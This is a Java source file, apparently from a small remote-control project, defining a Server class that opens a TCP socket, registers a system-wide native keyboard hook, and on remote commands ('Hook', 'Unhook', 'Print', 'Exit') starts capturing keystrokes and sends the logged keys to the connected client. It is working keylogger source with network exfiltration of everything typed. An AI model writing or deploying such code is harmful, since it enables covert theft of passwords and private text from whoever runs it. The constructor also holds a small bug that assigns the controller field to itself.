package model;

import java.io.*;
import java.net.*;
import java.util.Scanner;

import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.GlobalScreen;

import controller.Controller;

public class Server {
    private enum Status {
        STOP,
        SUSPEND,
        RUNNING,
    };
    private ServerSocket serverSock;
    private Socket clientSock;
    private InputStream inputStream;
    private OutputStream outputStream;
    private KeyLogger keyLogger;
    private Controller controller;
    private Status status;
    private boolean isHooked;

    public Server(int port, int backlog) {
        this.controller = controller;
        createServerSocket(port, backlog);
        keyLogger = new KeyLogger();

        status = Status.STOP;
        isHooked = false;
        
        // Register NativeHook for KeyLogger

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            System.exit(1);
        }
    }

    public void run() {
        status = Status.RUNNING;

        new Thread(new Runnable() {
            public void run() {
                acceptClient();

                while(status == Status.RUNNING) {
                    byte[] buffer = new byte[128];
                    try {
                        inputStream.read(buffer);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    String action = new String(buffer).trim();
                    System.out.println(action);

                    switch (action) {
                        case ("Hook"):
                        case ("Unhook"):
                        case ("Print"): {
                            handleKeyLogging(action);
                            break;
                        }
                        case ("Exit"): {
                            status = Status.STOP;
                            break;
                        }
                    }
                }

                cleanup();
            }
        }).start();

    }

    public void addController(Controller controller) {
        this.controller = controller;
    }

    private void handleKeyLogging(String action) {
        notifyController(action);
        switch(action) {
            case ("Hook"): {
                if (isHooked == false) {
                    GlobalScreen.addNativeKeyListener(keyLogger);
                    isHooked = true;
                }
                break;
            }
            case ("Unhook"): {
                if (isHooked == true) {
                    GlobalScreen.removeNativeKeyListener(keyLogger);
                    keyLogger.clearLogs();
                    isHooked = false;
                }
                break;
            }
            case ("Print"): {
                String out = "";
                for (int i = 0; i < keyLogger.logs.size(); i++) {
                    out += keyLogger.logs.get(i);
                }
                byte[] tmp = out.getBytes();

                try {
                    outputStream.write(tmp);
                } catch (Exception e) {
                    e.printStackTrace();
                }
                break;
            }
        }
    }

    private void notifyController(String action) {
        controller.handleAction(action);
    }

    private void acceptClient() {
        try {
            clientSock = serverSock.accept();
            inputStream = clientSock.getInputStream();
            outputStream = clientSock.getOutputStream();
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void createServerSocket(int port, int backlog) {
        try {
            serverSock = new ServerSocket(port, backlog);
        }
        catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void cleanup() {
        try {
            GlobalScreen.unregisterNativeHook();
            serverSock.close();
            clientSock.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
